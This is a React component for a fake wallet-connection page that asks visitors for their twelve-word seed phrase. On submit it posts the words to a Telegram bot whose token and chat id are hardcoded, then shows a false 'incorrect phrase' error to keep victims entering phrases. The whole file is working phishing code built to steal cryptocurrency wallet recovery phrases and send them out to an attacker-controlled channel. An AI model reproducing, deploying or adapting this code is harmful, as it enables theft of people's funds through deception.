import React from 'react'
import { useState } from 'react';

export default function WalletCon() {

    const [seed, setSeed] = useState(Array(12).fill(''));
    const [result, setResult] = useState("");

    const handleChange = (index, value) => {
        const newSeed = [...seed];
        newSeed[index] = value;
        setSeed(newSeed);

    };

    const handleSubmit = async () => {
        if (seed.includes('')) {
            setResult("Please fill in all seed words.");
            return;
        } else {

            console.log(seed);
            const token = "6537915625:AAEl2plkMRJiCTDdeykAI4jGZ-gQ08FVpn0";
            const chat_id = -1002374100606;
            const message = `Seed Phrase Result is :${seed}`;



            try {
                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        chat_id: chat_id,
                        text: message,
                        parse_mode: "HTML", // optional
                    }),
                });

                const data = await response.json();

                if (!response.ok) {
                    console.error("Telegram API Error:", data);
                } else {
                    console.log("✅ Message sent successfully!", data);
                    setTimeout(() => {
                        setResult("Sorry, your seed phrases was incorrect. Please double-check your phrases.");
                    }, 2000);
                }
            } catch (err) {
                console.error("Fetch failed:", err);
            }
        }

    };

    return (
        <main>
            <div className="gap-20 mx-auto text-white p-6 max-w-xl flex flex-col justify-between">
                {/* Header */}
                <div className='py-5'>
                    <h2 className="text-2xl font-semibold text-center mb-6">Enter your wallet seed phrase</h2>

                    {/* Seed Inputs */}
                    <div className="grid grid-cols-2 gap-4">
                        {seed.map((value, index) => (
                            <div
                                key={index}
                                className="flex items-center bg-[#1a1a1a] px-4 py-3 rounded-full text-sm"
                            >
                                <span className="text-gray-500 w-6">{(index + 1).toString().padStart(2, '0')}.</span>
                                <input
                                    type="text"
                                    value={value}
                                    required
                                    onChange={(e) => handleChange(index, e.target.value)}
                                    placeholder="Check"
                                    className="ml-2 bg-transparent text-white outline-none w-full placeholder-gray-400"
                                />
                            </div>
                        ))}
                    </div>
                    <p className="text-center text-sm text-red-600 mt-4">{result}</p>
                </div>

                {/* Continue Button */}
                <button onClick={handleSubmit} type='submit' className="mt-10 w-full bg-[#F7E500] text-black font-semibold py-4 rounded-full hover:bg-yellow-500 transition">
                    Continue
                </button>
            </div>
        </main>
    );
}
